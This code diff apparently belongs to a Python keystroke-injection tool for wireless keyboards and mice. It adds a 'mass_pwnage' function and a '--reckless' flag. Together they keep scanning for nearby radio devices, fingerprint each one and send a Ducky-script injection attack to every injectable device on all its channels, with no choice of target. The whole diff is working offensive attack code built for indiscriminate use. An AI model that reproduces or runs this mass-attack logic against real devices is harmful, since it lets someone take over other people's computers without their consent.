@@ -454,6 +454,29 @@ def fingerprint_device(r, a, p):
         return False
 
 
+def mass_pwnage(r, s, a):
+    while True:
+        print '[+] Scanning...'
+        devices = s.scan(60.0)
+
+        for addr, target in devices.iteritems():
+            payload = target['payload']
+            channels = target['channels']
+            address = target['address']
+
+            print "[+] Found target %s with payload %s" % (addr, s.hexify(payload))
+            s.sniff(address)
+            device = fingerprint_device(r, address, payload)
+
+            if device:
+                for channel in channels:
+                    r.set_channel(channel)
+                    print '[+] Sending attack to %s [%s] on channel %d' % (addr, device.device_type, channel)
+                    device.send_attack(a)
+            else:
+                print "[-] Target %s is not injectable. Skipping..." % (addr)
+
+
 def _debug(debug, text):
     if debug:
         print P + "[D] " + W + text
@@ -486,7 +509,8 @@ def confirmroot():
 @click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
 @click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
 @click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
-def cli(debug, script, lowpower, interval):
+@click.option('--reckless', is_flag=True, help='Reckless mode: indiscriminately launch attacks (Caution!)')
+def cli(debug, script, lowpower, interval, reckless):
 
     banner()
     confirmroot()
@@ -520,6 +544,13 @@ def cli(debug, script, lowpower, interval):
 
     # Create scanner instance
     scan = NordicScanner(radio=radio, debug=debug)
+
+    if reckless:
+        if attack == "":
+            print R + "[!} " + W + 'Cannot use reckless mode without attack'
+            exit(-1)
+        else:
+            mass_pwnage(radio, scan, attack)
 
     print G + "[+] " + W + 'Scanning...'
 
